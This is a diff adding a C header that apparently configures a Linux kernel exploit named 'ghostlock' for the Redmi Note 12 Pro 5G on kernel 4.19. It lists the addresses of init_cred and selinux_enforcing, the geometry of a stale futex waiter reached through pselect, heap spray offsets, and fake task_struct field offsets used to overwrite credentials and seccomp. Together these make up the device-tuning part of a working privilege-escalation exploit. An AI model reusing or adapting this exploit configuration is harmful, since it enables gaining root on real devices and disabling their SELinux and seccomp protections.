@@ -1,0 +1,77 @@
+/*
+ * Ruby (MT6877 / Redmi Note 12 Pro 5G) 4.19 target.
+ *
+ * Single authoritative compile-time target file for the ruby production
+ * build.  Keep only the offsets and constants used by this 4.19 route.
+ */
+#ifndef TARGET_RUBY_H
+#define TARGET_RUBY_H
+
+#define GHOSTLOCK_TARGET_4_19 1
+#define TARGET_KERNEL_RELEASE "4.19.191-ge6429b82e599"
+#define BUILD_VARIANT_LABEL "ghostlock_ruby"
+
+/* pselect route geometry.  The stale futex waiter starts at
+ * core_sys_select bits[] + 0x98 (fd_set word 19); fops.c labels the first
+ * waiter qword as word 2, so the shift is 19 - 2 = 17. */
+#define PSELECT_WAITER_WORD_SHIFT 17
+#define PSELECT_ROUTE_NFDS 640
+
+/* 39-bit kernel virtual layout. */
+#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
+#define P0_PAGE_OFFSET 0xffffff8000000000ULL
+#define P0_PHYS_OFFSET 0x40000000ULL
+#define P0_KERNEL_PHYS_LOAD 0x40080000ULL
+#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
+#define DIRECT_MAP_BASE 0xffffff8000000000ULL
+#define DIRECT_MAP_END 0xffffff9000000000ULL
+
+/* 4.19 mm_struct SLUB slab stride. */
+#define MM_STRUCT_SZ 0x3c0
+
+/* Symbol offsets (relative to KIMAGE_TEXT_BASE). */
+#define INIT_CRED_OFF 0x00000000022137b8ULL
+#define SELINUX_ENFORCING_OFF 0x0000000002629981ULL
+#define SLIDE_NFULNL_LOGGER_OFF 0x00000000021be850ULL
+#define SLIDE_SYSCTL_BOOTID_OFF 0x000000000263132cULL
+#define SLIDE_INIT_TASK_OFF 0x0000000002209300ULL
+#define SLIDE_ROOT_TASK_GROUP_OFF 0x000000000240f000ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x000000000263132cULL
+
+#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
+#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
+#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
+#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
+
+/* Spray layout. */
+#define LOCK_OFF 0x1350
+#define W0_OFF 0x2220
+#define FOPS_OFF 0x1000
+#define RIGHT_OFF 0x4440
+#define LEFT_OFF 0x5550
+#define FAKE_TASK_OFF 0x3200
+#define CRED_COPY_OFF 0x1080
+
+/* 4.19 rt_mutex_waiter form. */
+#define LEGACY_RT_MUTEX_WAITER 1
+#define COMPACT_RT_MUTEX_WAITER 0
+
+/* task_struct offsets verified for this build. */
+#define FAKE_TASK_USAGE_OFF 0x30
+#define FAKE_TASK_PRIO_OFF 0x78
+#define FAKE_TASK_NORMAL_PRIO_OFF 0x80
+#define FAKE_TASK_TASK_GROUP_OFF 0x338
+#define FAKE_TASK_PI_LOCK_OFF 0x82c
+#define FAKE_TASK_PI_WAITERS_OFF 0x838
+#define FAKE_TASK_PI_TOP_TASK_OFF 0x848
+#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x850
+#define TASK_CRED_OFF 0x760
+#define TASK_COMM_OFF 0x768
+#define TASK_THREAD_INFO_FLAGS_OFF 0x00
+#define TASK_SECCOMP_OFF 0x808
+
+#endif /* TARGET_RUBY_H */
